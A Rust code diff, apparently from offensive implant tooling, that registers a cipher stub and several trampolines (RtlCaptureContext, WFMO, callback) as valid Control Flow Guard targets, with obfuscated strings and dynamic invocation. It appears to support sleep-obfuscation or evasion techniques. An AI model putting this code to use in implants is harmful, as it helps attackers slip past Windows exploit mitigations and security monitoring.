@@ -82,6 +82,32 @@ pub fn add_cfg(module: usize, function: usize) -> Result<()> {
     Ok(())
 }
 
+/// Adds a valid CFG call target for a standalone allocation (not backed by a PE module).
+/// Uses page-aligned base and page-sized region for SetProcessValidCallTargets.
+pub fn add_cfg_standalone(function: usize) -> Result<()> {
+    let page_base = function & !0xFFF;
+    let offset = function - page_base;
+    let size = 0x1000; // single page
+
+    let mut cfg_info = CFG_CALL_TARGET_INFO {
+        Flags: CFG_CALL_TARGET_VALID,
+        Offset: offset,
+    };
+
+    if SetProcessValidCallTargets(
+        NtCurrentProcess(),
+        page_base as *mut c_void,
+        size,
+        1,
+        &mut cfg_info
+    ) == 0
+    {
+        bail!(s!("SetProcessValidCallTargets (standalone) Failed"))
+    }
+
+    Ok(())
+}
+
 /// Registers known indirect call targets with Control Flow Guard (CFG).
 pub fn register_cfg_targets(cfg: &Config) {
     let targets = [(cfg.modules.ntdll, cfg.nt_continue)];
@@ -89,6 +115,42 @@ pub fn register_cfg_targets(cfg: &Config) {
         if let Err(e) = add_cfg(module.as_u64() as usize, func.as_u64() as usize) {
             if cfg!(debug_assertions) {
                 dinvk::println!("add_cfg failed: {e}");
+            }
+        }
+    }
+
+    // Register custom cipher stub as valid CFG target
+    if cfg.custom_encrypt != 0 {
+        if let Err(e) = add_cfg_standalone(cfg.custom_encrypt as usize) {
+            if cfg!(debug_assertions) {
+                dinvk::println!("add_cfg_standalone (cipher stub) failed: {e}");
+            }
+        }
+    }
+
+    // Register callback trampoline as valid CFG target
+    if cfg.callback != 0 {
+        if let Err(e) = add_cfg_standalone(cfg.callback as usize) {
+            if cfg!(debug_assertions) {
+                dinvk::println!("add_cfg_standalone (callback) failed: {e}");
+            }
+        }
+    }
+
+    // Register RtlCaptureContext trampoline as valid CFG target
+    if cfg.trampoline != 0 {
+        if let Err(e) = add_cfg_standalone(cfg.trampoline as usize) {
+            if cfg!(debug_assertions) {
+                dinvk::println!("add_cfg_standalone (trampoline) failed: {e}");
+            }
+        }
+    }
+
+    // Register WFMO trampoline as valid CFG target
+    if cfg.wfmo_trampoline != 0 {
+        if let Err(e) = add_cfg_standalone(cfg.wfmo_trampoline as usize) {
+            if cfg!(debug_assertions) {
+                dinvk::println!("add_cfg_standalone (wfmo_trampoline) failed: {e}");
             }
         }
     }
